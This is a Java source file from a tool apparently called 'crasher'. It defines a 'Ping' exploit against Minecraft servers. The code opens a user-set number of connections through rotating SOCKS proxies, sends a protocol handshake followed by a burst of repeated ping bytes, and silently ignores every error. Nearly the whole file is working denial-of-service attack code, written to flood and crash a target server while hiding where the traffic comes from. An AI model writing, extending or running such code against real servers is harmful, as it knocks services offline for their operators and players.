package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.PacketHelper;
import uwu.narumi.crasher.api.helper.ProtocolHelper;
import uwu.narumi.crasher.api.helper.ProxyHelper;
import uwu.narumi.crasher.api.io.NetOut;
import uwu.narumi.crasher.api.optimizer.Optimizer;
import uwu.narumi.crasher.api.packet.Packet;

@ExploitInfo(
    name = "Ping",
    description = "Simple ping packet",
    usage = "exploit ping <address> <amount>"
)
public class Ping extends Exploit<byte[]> {

  public Ping() {
    super(() -> {
          byte[] bytes = new byte[1000]; //500x ping request xd
          for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) (i % 2 == 0 ? 1 : 0); //will generate 1, 0
          }
          return bytes;
        },
        new Argument("version", 0, String.class),
        new Argument("address", 1, McAddress.class),
        new Argument("amount", 2, Integer.class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    McAddress address = (McAddress) args[1];
    int amount = (int) args[2];

    Packet handshake = PacketHelper.createHandshake(ProtocolHelper.getProtocol(args[0]), address.getIp(), (short) address.getPort(), 1);

    index.set(0);
    Optimizer.startOptimizing(Ping.class);
    for (int i = 0; i < amount; i++) {
      Optimizer.post(() -> {
        Proxy proxy = ProxyHelper.getSocks();
        try {
          Socket socket = ProxyHelper.createSocket(proxy);
          if (socket == null)
            throw new ThreadDeath();

          socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
          NetOut netOut = new NetOut(socket.getOutputStream());
          handshake.send(netOut);
          netOut.write(exploitSource().get());

          System.out.println(String.format(" %s -> %s | %s/%s", proxy, address.toString(), index.getAndIncrement(), amount));
          Optimizer.update();
        } catch (Exception ignored) {
        }
      });
    }
  }
}